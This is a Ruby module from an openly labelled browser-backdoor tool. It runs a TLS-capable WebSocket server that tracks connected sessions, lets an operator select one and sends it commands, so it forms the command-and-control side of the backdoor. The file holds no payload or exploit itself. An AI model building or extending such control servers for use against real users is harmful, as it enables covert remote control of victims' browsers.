#
# Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
# BrowserBackdoorServer by IMcPwn.
# See the file 'LICENSE' for copying permission
#

require_relative 'printcolor'
require 'em-websocket'

module Bbs

class WebSocket
    @@wsList = Array.new
    @@selected = -1
    def setSelected(newSelected)
        @@selected = newSelected
    end
    def getSelected()
        return @@selected
    end
    def getWsList()
        return @@wsList
    end
    def setWsList(newWsList)
        @@wsList = newWsList
    end
    def startEM(host, port, secure, priv_key, cert_chain)
        EM.run {
            EM::WebSocket.run({
                :host => host,
                :port => port,
                :secure => secure,
                :tls_options => {
                            :private_key_file => priv_key,
                            :cert_chain_file => cert_chain
            }
            }) do |ws|
                @@wsList.push(ws)
                ws.onopen { |handshake|
                    PrintColor::print_notice("WebSocket connection open: " + handshake.to_s)
                }
                ws.onclose {
                    PrintColor::print_error("Connection closed")
                    @@wsList.delete(ws)
                   # TODO: Change this.
                    # Reset selected error so the wrong session is not used.
                    @@selected = -1
                }
                ws.onmessage { |msg|
                    PrintColor::print_notice("Response received: " + msg)
                }
                ws.onerror { |e|
                    PrintColor::print_error(e.message)
                    @@wsList.delete(ws)
                    # Reset selected variable after error.
                    @@selected = -1
                }
            end
        }
    end
    
    def self.sendCommand(cmd, ws)
        ws.send(cmd)
    end
end

end
